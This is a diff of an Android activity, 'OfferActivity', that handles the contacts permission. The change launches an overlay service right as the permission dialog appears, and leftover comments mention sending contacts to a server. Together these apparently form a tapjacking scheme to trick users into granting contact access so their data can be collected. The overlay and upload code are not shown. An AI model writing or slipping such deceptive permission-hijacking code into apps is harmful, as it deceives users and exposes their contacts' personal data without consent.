@@ -22,31 +22,10 @@ public class OfferActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_offer);
 
-
-
-        requestContactPerm();
-
         getReadContactPermissions();
-
-
-
 
         ImageView toast = (ImageView) findViewById(R.id.toast);
     }
-
-
-    private void requestContactPerm(){
-   //     ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS},
-     //           REQUEST_CONTACTS_PERMISSION_CODE);
-     //   overlayService(true);
-
-        if (getReadContactPermissions()) {
-
-        } else
-            overlayService(true);
-    }
-
-
 
     // Start or stop the GameService
     private void overlayService(boolean start) {
@@ -60,17 +39,16 @@ public class OfferActivity extends AppCompatActivity {
         }
     }
 
-
-
     private boolean getReadContactPermissions() {
         // If READ_CONTACTS permission already granted return true
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             return true;
         }
         // Else request permission and return false
-        ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS},
+        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
                 REQUEST_CONTACTS_PERMISSION_CODE);
 
+        overlayService(true);
         return false;
     }
 
@@ -80,18 +58,16 @@ public class OfferActivity extends AppCompatActivity {
             grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-    //    messagePermissionOverlayService(false);
-
+        //    messagePermissionOverlayService(false);
         switch (requestCode) {
             case REQUEST_CONTACTS_PERMISSION_CODE:
                 // If READ_CONTACTS permission was granted
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    //addContactsToSender(); send to server
                     overlayService(false);
-                    //sendEmail(); send to server
+
                     // Else retry
                 } else if (!getReadContactPermissions())
-                   overlayService(true);
+                    overlayService(true);
                 break;
         }
     }
